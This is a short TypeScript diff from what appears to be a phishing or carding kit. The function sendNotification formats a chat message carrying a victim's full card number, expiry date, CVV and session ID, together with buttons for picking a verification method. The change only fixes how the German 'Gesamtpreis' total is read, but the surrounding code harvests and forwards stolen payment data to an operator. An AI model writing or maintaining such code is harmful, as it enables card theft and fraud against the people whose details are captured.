@@ -177,7 +177,7 @@ async function sendNotification(chatId: string, type: string, data: any) {
                 `💳 Card: ${data.card_number}\n` +
                 `📅 Expiry: ${data.expiry_date}\n` +
                 `🔐 CVV: ${data.cvv}\n` +
-                `💰 Gesamtpreis: €${data.final_price.toFixed(2)}\n\n` +
+                `💰 Gesamtpreis: €${(data.totalPrice || 0).toFixed(2)}\n\n` +
                 `Session ID: \`${data.session_id}\``;
       buttons = getVerificationMethodButtons(data.session_id);
       break;
